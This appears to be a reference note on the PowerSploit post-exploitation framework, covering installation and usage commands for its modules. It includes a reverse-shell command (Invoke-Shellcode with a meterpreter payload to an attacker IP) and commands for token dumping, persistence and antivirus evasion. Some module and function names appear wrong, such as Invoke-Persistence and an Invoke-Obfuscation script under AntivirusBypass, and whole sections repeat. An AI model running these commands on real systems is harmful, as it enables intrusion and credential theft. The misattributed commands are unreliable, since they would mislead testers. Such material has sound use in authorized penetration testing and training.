## Overview
PowerSploit is a collection of Microsoft PowerShell scripts that are designed to assist penetration testers and security researchers in post-exploitation, offensive security tasks, and red teaming. PowerSploit includes modules for code execution, persistence, privilege escalation, reconnaissance, exfiltration, and antivirus bypass, making it a versatile and powerful framework for offensive security operations. Since PowerShell is natively available on all modern Windows operating systems, PowerSploit is an effective tool for targeting Windows environments.

PowerSploit is widely used to automate various post-exploitation tasks, enabling attackers and penetration testers to gain deeper access, maintain persistence, and exfiltrate sensitive data.

## Features
- **Code Execution:** Modules to execute arbitrary code on remote systems using various techniques.
- **Persistence:** Techniques for maintaining persistence on compromised systems, such as creating scheduled tasks and registry modifications.
- **Privilege Escalation:** Modules to elevate privileges using known Windows vulnerabilities and misconfigurations.
- **Reconnaissance:** Tools to gather information about the target environment, including network scanning and credential harvesting.
- **Exfiltration:** Modules to exfiltrate sensitive data from compromised systems.
- **Antivirus Bypass:** Techniques for bypassing antivirus detection using obfuscation and code injection.
- **Cross-Platform Support:** Designed primarily for Windows, but some modules can be adapted for cross-platform use with PowerShell Core.

## Website
- [PowerSploit GitHub Repository](https://github.com/PowerShellMafia/PowerSploit)

## Installation

### On Windows:

1. **Clone the PowerSploit Repository from GitHub:**

```sh
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd PowerSploit
```

2. **Unblock the Downloaded Scripts:**

   - PowerShell may block scripts downloaded from the internet. To unblock them, run:

```powershell
Get-ChildItem -Recurse | Unblock-File
```

3. **Import PowerSploit Modules:**

   - Import specific PowerSploit modules you want to use:

```powershell
Import-Module .\Recon\Recon.psm1
Import-Module .\Exfiltration\Exfiltration.psm1
```

### On Unix-based Systems (Linux/macOS):

1. **Install PowerShell Core:**

   - PowerSploit requires PowerShell Core to run on Unix-based systems. Install it using your package manager.

   - **On Debian-based systems:**

```sh
sudo apt-get install -y powershell
```

   - **On macOS using Homebrew:**

```sh
brew install --cask powershell
```

2. **Clone the PowerSploit Repository:**

```sh
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd PowerSploit
```

3. **Run PowerShell Core and Import Modules:**

```powershell
Import-Module ./Recon/Recon.psm1
Import-Module ./Exfiltration/Exfiltration.psm1
```

## Basic Usage
PowerSploit is divided into several modules, each targeting specific post-exploitation tasks. Here are some common commands and usage examples:

### Reconnaissance
To gather information about the target environment, such as network scanning and credential harvesting:

```powershell
Import-Module ./Recon/Recon.psm1
Get-NetLocalGroup
```

- **`Get-NetLocalGroup`**: Lists local groups on the target system.

### Code Execution
To execute arbitrary code on a remote system:

```powershell
Import-Module ./CodeExecution/Invoke-Shellcode.ps1
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <attacker-ip> -Lport 443
```

- **`Invoke-Shellcode`**: Executes shellcode on the target system.

### Privilege Escalation
To elevate privileges on the compromised system:

```powershell
Import-Module ./Privesc/Privesc.psm1
Invoke-AllChecks
```

- **`Invoke-AllChecks`**: Performs various checks to identify privilege escalation opportunities.

### Persistence
To maintain persistence on a compromised system:

```powershell
Import-Module ./Persistence/Persistence.psm1
Invoke-Persistence -Registry -Daily -At 9am
```

- **`Invoke-Persistence`**: Creates a scheduled task for persistence.

### Exfiltration
To exfiltrate sensitive data from the compromised system:

```powershell
Import-Module ./Exfiltration/Exfiltration.psm1
Invoke-TokenManipulation -DumpTokens
```

- **`Invoke-TokenManipulation`**: Dumps security tokens for exfiltration.

### Antivirus Bypass
To bypass antivirus detection using obfuscation techniques:

```powershell
Import-Module ./AntivirusBypass/Invoke-Obfuscation.ps1
Invoke-Obfuscation
```

- **`Invoke-Obfuscation`**: Obfuscates PowerShell scripts to evade antivirus detection.

## Key Features and Modules

### Code Execution
- **Description:** Provides methods to execute arbitrary code on remote systems using PowerShell, shellcode injection, and other techniques.
- **Usage:**
```powershell
Import-Module ./CodeExecution/Invoke-Shellcode.ps1
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <attacker-ip> -Lport 443
```

### Persistence
- **Description:** Includes various techniques to maintain access to compromised systems, such as creating scheduled tasks or modifying the registry.
- **Usage:**
```powershell
Import-Module ./Persistence/Persistence.psm1
Invoke-Persistence -Registry -Daily -At 9am
```

### Privilege Escalation
- **Description:** Contains modules for elevating privileges on a compromised system by exploiting known vulnerabilities and misconfigurations.
- **Usage:**
```powershell
Import-Module ./Privesc/Privesc.psm1
Invoke-AllChecks
```

### Reconnaissance
- **Description:** Provides tools to gather information about the target environment, including network scanning, credential harvesting, and system enumeration.
- **Usage:**
```powershell
Import-Module ./Recon/Recon.psm1
Get-NetLocalGroup
```

### Exfiltration
- **Description:** Includes modules for exfiltrating sensitive data from compromised systems, such as dumping credentials and security tokens.
- **Usage:**
```powershell
Import-Module ./Exfiltration/Exfiltration.psm1
Invoke-TokenManipulation -DumpTokens
```

### Antivirus Bypass
- **Description:** Provides techniques for evading antivirus detection using script obfuscation and other methods.
- **Usage:**
```powershell
Import-Module ./AntivirusBypass/Invoke-Obfuscation.ps1
Invoke-Obfuscation
```

## Tools for Post-Exploitation and Offensive Security Using PowerSploit

- **Code Execution:** Use PowerSploit to execute arbitrary code and payloads on compromised systems to gain deeper access.
- **Privilege Escalation:** Identify and exploit privilege escalation opportunities to elevate access on a compromised system.
- **Persistence:** Establish persistent access to compromised systems to maintain control over long periods.
- **Reconnaissance and Enumeration:** Gather detailed information about the target environment to identify weaknesses and potential attack vectors.
- **Data Exfiltration:** Exfiltrate sensitive data from compromised systems to extract valuable information and credentials.
- **Antivirus Evasion:** Bypass antivirus detection using obfuscation techniques to execute malicious scripts without detection.

## Best Practices
- **Use PowerSploit Responsibly:** Always ensure that you have proper authorization before using PowerSploit for offensive security tasks and post-exploitation activities.
- **Stay Within Legal Boundaries:** Be aware of the legal implications of using offensive security tools and ensure compliance with local laws and regulations.
- **Combine with Other Tools:** Use PowerSploit alongside other post-exploitation tools like [[Mimikatz]], [[Empire]], and [[Metasploit]] for comprehensive assessments.
- **Keep PowerSploit Updated:** Regularly update PowerSploit to benefit from the latest features, security enhancements, and bug fixes.
- **Analyze Results Carefully:** Review the output of PowerSploit modules carefully to identify potential vulnerabilities, misconfigurations, and opportunities for further exploitation.

## References
- [PowerSploit GitHub Repository](https://github.com/PowerShellMafia/PowerSploit)
- [PowerSploit Documentation](https://github.com/PowerShellMafia/PowerSploit/wiki)
- [Using PowerSploit for Post-Exploitation](https://null-byte.wonderhowto.com/how-to/use-powersploit-for-post-exploitation-on-windows-0198767/)
- [PowerSploit Cheat Sheet](https://highon.coffee/blog/powersploit-cheat-sheet/)
- [PowerSploit Tutorial for Offensive Security](https://www.hackingarticles.in/comprehensive-guide-on-powersploit-for-red-team-operations/)

